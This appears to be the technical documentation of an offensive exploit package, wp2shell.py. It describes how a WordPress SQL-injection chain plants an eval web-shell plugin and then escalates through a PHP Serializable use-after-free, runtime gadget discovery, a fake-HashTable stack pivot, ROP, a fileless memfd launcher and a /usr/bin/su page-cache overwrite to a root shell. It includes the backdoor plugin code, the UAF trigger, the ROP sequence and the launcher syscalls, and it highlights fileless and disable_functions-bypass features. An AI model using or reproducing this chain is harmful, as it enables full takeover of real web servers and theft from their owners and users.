# Full chain: WordPress eval endpoint to Serializable UAF, ROP, PIC, and root

## Scope

This document covers the native-code half of this package after the WordPress
chain has already produced an eval endpoint.

The full progression is:

```text
WordPress eval endpoint
    -> Serializable shared-var_hash UAF
    -> arbitrary read / heap discovery
    -> live PHP ELF discovery
    -> dynamic gadget scan
    -> fake HashTable stack pivot
    -> ROP chain
    -> raw PIC launcher
    -> helper ELF
    -> /usr/bin/su page-cache overwrite
    -> root command or root shell over a loopback control socket
```

There are three post-exploitation mode families after the WordPress stage:

| Mode family | PHP payload evaluated by the plugin | End result |
|---|---|---|
| `--uaf-exec`, `--uaf-connect`, `--uaf-bash-connect` | `local_exploit.php` | Recover the hidden `zif_system` handler and call it as `www-data` even when `disable_functions` removed the public `system()` symbol. |
| `--pic-file` | `rop_serializable.php` | Use the same UAF to build a live ROP chain and execute caller-supplied raw PIC inside the PHP worker. |
| `--priv-exec`, `--priv-shell` | `rop_serializable.php` plus a packed launcher/helper blob | Use the ROP path to start the helper from an anonymous memfd, then use the helper's page-cache overwrite primitive to transition into a root shell or root command. |

The full [wp2shell.py](./wp2shell.py) entry point exposes all three rows in
that table.

The important distinction is that the WordPress bug only gets the process to
an eval endpoint. The UAF, ROP construction, and helper LPE all happen after
arbitrary PHP has already been reached.

## 0. WordPress stage before the native handoff

The WordPress part still matters:

```text
REST desync -> SQLi reachability -> forged WP_Post objects
-> re-entrant administrator creation -> plugin upload -> eval endpoint
```

The REST desync makes the SQL sink reachable. The SQL injection returns
attacker-shaped `wp_posts` rows, WordPress turns them into cached `WP_Post`
objects, later trusted code consumes those objects, and the request re-enters
the REST layer under administrator context. The exploit then creates an
administrator and uploads the eval endpoint.

Once that endpoint exists, everything below is PHP/native post-exploitation.

## 0.1. The eval endpoint is only a transport boundary

The uploaded plugin is intentionally minimal:

```php
if ( isset( $_REQUEST['e'] ) ) {
    echo 'WP2SHELL:';
    eval( base64_decode( (string) $_REQUEST['e'] ) );
}
```

The Python client reuses that endpoint as a carrier:

1. read `local_exploit.php` or `rop_serializable.php` from disk;
2. strip the opening `<?php`;
3. base64-encode the PHP body into request parameter `e`;
4. add mode-specific request parameters:
   - `wpr_mode` and `wpr_payload` for the fake-Closure/UAF command path;
   - `wpr_pic` for the ROP/PIC path; and
5. let the uploaded plugin evaluate the body inside the live PHP worker.

The transition is therefore:

```text
HTTP request to eval plugin
  -> ordinary PHP eval()
  -> PHP engine memory corruption
  -> native control-flow hijack
```

The WordPress portion is finished before the UAF starts.

## 1. The memory bug used by this package

The package uses the legacy `Serializable` path in PHP.

The relevant object is:

```php
class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        unserialize($data)->x = 0;
    }
}
```

The key bug is that `zend_user_unserialize()` invokes the userland
`unserialize()` method without incrementing `BG(serialize_lock)` first.

That means the recursive inner `unserialize()` shares the outer parser's
`var_hash` reference table.

The exploit feeds an inner `stdClass` with exactly eight properties. That
fills a property HashTable at size 8. The single `->x = 0` write is the ninth
insert, so PHP resizes the table from 8 to 16 buckets and frees the original
`arData` allocation.

The outer serialized structure still contains `R:N` references pointing into
the old property zvals.

Those references are now dangling references into freed memory.

That is the primitive:

```text
freed inner property zvals
    -> outer R:N references still point there
    -> attacker-controlled overlap rewrites those stale zvals
```

The outer serialized array is deliberately arranged as:

```text
element 0       CachedData(inner stdClass with 8 properties)
elements 1..32  sprayed strings sized to reclaim freed arData
elements 33..   R:4 .. R:11 back-references into the freed property zvals
```

Those `R:N` references are what survive the inner HashTable resize. The
exploit does not get a free-form write primitive immediately; it gets stale
zvals whose type and value fields can be overlapped by reclaimed string data.

## 2. Turning the UAF into memory access

The driver sprays strings so that one of those strings reuses the freed
`arData` slot.

It then rewrites the stale zval metadata to make PHP interpret attacker-chosen
bytes as different zval types.

The important helpers are:

- `build_spray_islong()`
- `build_spray_isstring()`
- `build_spray_isobject()`
- `build_spray_isarray()`
- `uaf_read()`

The exploit first gets a heap pointer by looking for sprayed values whose
contents changed after the stale zval overlap. `build_spray_islong()` seeds
distinct marker integers into each candidate slot; once one marker changes,
the new eight-byte value is interpreted as a leaked heap pointer.

After that it uses fake `IS_STRING` zvals to read arbitrary memory:

```text
fake zend_string pointer
    -> PHP returns string bytes from attacker-selected address
    -> arbitrary read primitive
```

`uaf_read()` is the core of the whole native chain. It forges a stale zval into
an `IS_STRING`, points it at `target - 0x18 - bias`, and lets PHP hand back the
bytes as an ordinary userland string. The `bias` sweep compensates for the
fake `zend_string` header requirement and for reads near mapping boundaries.
Every later discovery step is built on repeated calls to that one primitive.

The same stale-zval machinery is also reused for the two final control
primitives:

- `build_spray_isobject()` makes a fake Closure callable for the
  `disable_functions` bypass path.
- `build_spray_isarray()` makes a fake HashTable whose destructor path is used
  for the ROP pivot.

That arbitrary read is used to:

1. locate sprayed Closure objects
2. recover their `ce` and `handlers` pointers
3. locate `executor_globals`
4. find the live function table
5. obtain a live internal function handler anchor

The Closure scan is also dynamic. The driver sprays hundreds of real Closures,
scans the surrounding heap chunk for repeated `zend_object` layouts, and picks
the most common `(ce, handlers)` pair. That yields a live class entry pointer
and a live handlers pointer without a fixed heap profile.

At this point the two native branches diverge:

```text
arbitrary read
  -> fake Closure path: recover zif_system -> command/callback as www-data
  -> fake HashTable path: recover ELF/gadgets -> ROP -> PIC -> helper -> root
```

The root path does not need the fake Closure command sink. It keeps using the
same UAF-derived read primitive until it has enough live process information to
build the ROP chain.

## 3. Finding the live PHP image

Once the driver has a live code pointer, it walks backward to find the loaded
PHP ELF image in memory. For PHP-FPM that image is the PIE executable. For
Apache/mod_php it is `libphp.so`, whose ET_DYN header legitimately has a zero
ELF entry point. The resolver accepts both cases and still validates the image
before using it.

The live code pointer comes from the function table found through
`executor_globals`. The driver looks up a still-enabled builtin such as
`var_dump`, `strlen`, `array_push`, or `getenv`, reads its internal handler
pointer, and treats that as an anchor inside the loaded PHP image.

From that anchor it:

1. aligns downward to 2 MiB boundaries;
2. probes candidate bases;
3. validates the ELF header and program headers;
4. confirms the anchor lies inside an executable PT_LOAD segment; and
5. accepts the first image whose structure is internally consistent.

The driver then parses:

- ELF headers
- PT_DYNAMIC
- dynamic string/symbol tables
- relocation entries

From that it resolves:

- `mprotect`
- `php_printf`
- `_zend_bailout`

The resolution method is also dynamic:

- `mprotect` comes from the live relocation/jump-slot table;
- `php_printf` and `_zend_bailout` come from the loaded image's dynamic symbol
  table; and
- no absolute address is embedded in the Python frontend or the PHP driver.

It also scans executable PT_LOAD segments for gadgets:

- `leave; ret`
- `pop rsp; ret`
- `pop rdi; ret`
- `pop rsi; ret`
- `pop rdx; ret`
- `pop rax; ret`
- `ret`

The important property is that nothing is hardcoded to a fixed PHP base or
fixed gadget offset. The driver discovers the live addresses at runtime.

The gadget scan is not a symbolic disassembler. It scans executable PT_LOAD
bytes for the exact short instruction sequences needed by the chain:

```text
leave; ret
pop rsp; ret
pop rdi; ret
pop rsi; ret
pop rdx; ret
pop rax; ret
ret
```

The chosen `pop rsp; ret` is additionally filtered so the low bits that overlap
`HashTable.u.flags` do not accidentally select Zend's packed/static destruction
paths before the destructor call.

## 3.1. What “targetless” means here

The ROP path is targetless in the address-resolution sense:

| Not hardcoded | How it is recovered at runtime |
|---|---|
| Heap address | UAF-based heap leak |
| Closure object pointers | Heap scan of sprayed Closures |
| Executor globals / function table | Pointer validation near live handlers |
| PHP base address | ELF validation from a live internal-function anchor |
| Gadget addresses | Byte scan of executable PT_LOAD segments |
| `mprotect`, `php_printf`, `_zend_bailout` | Dynamic symbols and relocation tables |
| ROP blob address | Random marker plus prefix scan in the current heap chunk |

That does not mean the chain is universal across arbitrary PHP builds. It still
depends on:

- PHP 8.1 NTS x86_64 structure layouts and calling convention;
- the Serializable UAF behaving the same way in the allocator;
- readable ELF metadata and executable PT_LOAD segments;
- the required gadget byte patterns existing somewhere in the loaded image; and
- the documented root-helper assumptions for the later LPE stage, including the
  `/usr/bin/su` target and the AF_ALG/`MSG_SPLICE_PAGES` primitive.

It is therefore better described as self-resolving or address-targetless, not
version-agnostic.

## 4. The controlled ROP blob

The driver allocates a large controlled string and lays out several structures
inside it:

```text
blob + 0x40   fake HashTable
blob + 0x100  ROP stack
blob + 0x300  PIC payload bytes
blob + ...    return message
blob + ...    marker used to rediscover blob address
```

The blob is found again in memory by scanning for a random marker plus a fixed
prefix:

```text
WP2SHELL_SERIALIZABLE_ROP
```

That avoids relying on hardcoded heap addresses.

The layout is intentionally simple:

| Blob offset | Meaning |
|---|---|
| `0x40` | fake `HashTable` used for the destructor pivot |
| `0x100` | ROP stack qwords |
| `0x300` | caller-supplied raw PIC bytes |
| later aligned slot | `"[+] WP2SHELL_ROP_RETURNED\n"` string |
| later aligned slot | random marker used to rediscover the blob |

The driver stores the blob in a PHP string, writes the random marker into it,
then uses the UAF read primitive to scan the heap chunk until it finds both the
marker and the expected fixed prefix. That gives it the live blob address even
if the allocator placed the string somewhere unexpected.

## 5. How the pivot works

The driver needs to turn the stale zval into control of `RSP`.

It does that by retyping the stale reference as an `IS_ARRAY` pointing to a
fake HashTable inside the controlled blob.

The final trigger is:

```php
$result[$idx] = null;
```

That replacement destroys the forged inner array value immediately.

The fake HashTable fields are arranged so that array destruction eventually
reaches:

```text
leave; ret
    -> pop rsp; ret
    -> RSP = chain_addr
```

The comments in `rop_serializable.php` describe this as:

```text
first pivot:  RBP = fake HashTable during zend_hash_destroy()
second pivot: fake arData / embedded pop_rsp_ret moves RSP to chain_addr
```

At that point normal PHP control flow is over. The process is executing the
ROP chain from the attacker-controlled blob.

The fake HashTable is engineered so normal Zend destruction code performs the
pivot for the attacker:

1. the stale zval is retyped to `IS_ARRAY`;
2. its value points at the fake HashTable inside the blob;
3. assigning `null` to the outer reference immediately destroys the forged
   inner array value;
4. `zend_array_destroy()` / `zend_hash_destroy()` consult the fake fields;
5. the fake destructor path reaches `leave; ret`; and
6. `pop rsp; ret` loads the controlled ROP stack address from fake `arData`.

No C-level callback pointer is hardcoded. The pivot reuses ordinary Zend array
destruction with fields that were derived from the live process itself.

## 6. How the ROP chain is built

The chain is assembled dynamically by `append_rop_call()`.

For each call it emits:

```text
pop <register>; ret
<argument>
...
target function
```

It also inserts a plain `ret` when needed so SysV AMD64 stack alignment is
correct at function entry.

In qword terms, each call is assembled from gadgets found in the current PHP
image:

```text
pop rdi ; ret      <arg1>
pop rsi ; ret      <arg2>
pop rdx ; ret      <arg3>
[optional ret for SysV alignment]
target function
```

The driver computes stack alignment from the live heap address of the ROP
stack. If the next function entry would violate `RSP % 16 == 8`, it inserts one
plain `ret` gadget before the call.

The chain sequence is:

```text
mprotect(blob_page, blob_len, PROT_READ|PROT_WRITE|PROT_EXEC)
payload_addr
mprotect(blob_page, blob_len, PROT_READ|PROT_WRITE)
php_printf("WP2SHELL_ROP_RETURNED")
_zend_bailout()
```

For a generic `--pic-file` payload, control may return from `payload_addr`, in
which case the driver restores permissions and prints:

```text
WP2SHELL_ROP_RETURNED
```

For `--priv-exec` and `--priv-shell`, the payload never returns because the PIC
launcher calls `execveat()` on the in-memory helper fd.

That is why the root path prints `WP2SHELL_ROP_DISPATCHING` but normally not
`WP2SHELL_ROP_RETURNED`: the process leaves PHP before the cleanup half of the
chain can run.

## 7. PIC execution

The Python client does not compile anything at runtime.

Build once:

```bash
make
```

That produces:

```text
build/root_payload_helper
build/root_payload_launcher.bin
```

At runtime the Python client:

1. loads the prebuilt launcher template
2. loads the prebuilt helper ELF
3. appends:
   - helper ELF bytes
   - helper argv[0]
   - helper arguments
4. patches the launcher manifest offsets
5. sends the final packed blob through `rop_serializable.php`

The launcher is the PIC payload executed by the ROP chain.

Its job is:

```text
memfd_create("php-helper", 0)
dup2(fd, 197)
write(197, helper ELF bytes)
execveat(197, "", argv, NULL, AT_EMPTY_PATH)
```

So the launcher is what turns native code execution inside PHP into execution
of the helper ELF.

The launcher itself is raw PIC. It does not know its own absolute address. The
manifest stores relative offsets to:

- the embedded helper ELF bytes;
- the helper argv[0] string; and
- the helper argv strings.

At runtime it uses `lea ... [rel _start]` as its base, adds those relative
offsets, writes the helper into an anonymous memfd, and `execveat()`s fd 197.
This is why the ROP stage can execute a prebuilt helper without any fixed
address inside the PHP process and without creating a normal filesystem entry.

## 8. How the helper performs the LPE

The helper in [root_payload_helper.c](./root_payload_helper.c) is a compact C
translation of the original Python `/usr/bin/su` primitive.

Its flow is:

1. build a tiny ELF payload in memory
2. open `/usr/bin/su`
3. overwrite the page-cache image of `/usr/bin/su` 4 bytes at a time
4. execute `/usr/bin/su`

The helper is a second-stage program, not part of the ROP chain itself. ROP is
only responsible for running the launcher. The launcher runs the helper. The
helper then performs the local privilege escalation.

The page-cache overwrite uses:

- `AF_ALG`
- `MSG_SPLICE_PAGES`
- `splice()`

The overwritten `/usr/bin/su` image runs:

```text
setresuid(0, 0, 0)
execveat(197, "", ["root-helper", "--pwned", "196"], NULL, AT_EMPTY_PATH)
```

Because `/usr/bin/su` is setuid-root, the overwritten image starts with root
privileges.

The helper-generated replacement ELF is small and purpose-built. It clears
credentials, re-enters the same helper from fd 197, and reads a compact config
blob from fd 196. For `--priv-exec`, the root reentry runs the requested
command, captures stdout/stderr in an anonymous pipe, and returns the result
through the authenticated loopback control socket. For `--priv-shell`, the
root reentry attaches `/bin/bash` to anonymous pipes and forwards commands and
output through that same socket.

This helper intentionally mirrors the original Python primitive closely, so
it normally yields:

```text
uid=0(root) gid=33(www-data) groups=33(www-data)
```

The user/group state is expected: the overwritten setuid target gives an
effective root UID, but the inherited supplementary groups are still those of
the PHP worker unless the payload explicitly changes them.

## 8.1. End-to-end control-flow timeline

| Phase | Live process state | Attacker-controlled object |
|---|---|---|
| WordPress | normal PHP request | forged `WP_Post` graph |
| Eval transport | same PHP worker | base64 PHP body in `e=` |
| UAF setup | same PHP worker | dangling `R:N` references |
| Memory discovery | same PHP worker | fake `IS_STRING` zvals |
| ROP setup | same PHP worker | fake HashTable plus controlled blob |
| Native pivot | same PHP worker | ROP stack plus PIC launcher |
| Helper launch | PHP worker replaced by helper ELF | launcher manifest plus embedded ELF |
| LPE | helper overwrites `/usr/bin/su` page cache | generated tiny ELF |
| Root action | `/usr/bin/su` image re-enters helper via fd 197 | root command or root shell over a loopback socket |

## 9. Root-stage observability

The fileless root path does not request an on-target ROP trace file. The helper
ELF, config blob, command output, and shell transport remain in anonymous fds
and loopback sockets. The root path still does not print
`WP2SHELL_ROP_RETURNED`, because the PIC launcher `execveat()`s the helper and
never returns to PHP.

## 10. Short version

```text
Serializable UAF
  -> stale R:N reference
  -> arbitrary read
  -> live PHP ELF + gadgets
  -> fake HashTable pivot
  -> ROP chain
  -> PIC launcher
  -> helper ELF
  -> /usr/bin/su page-cache overwrite
  -> root command / root shell over a loopback socket
```
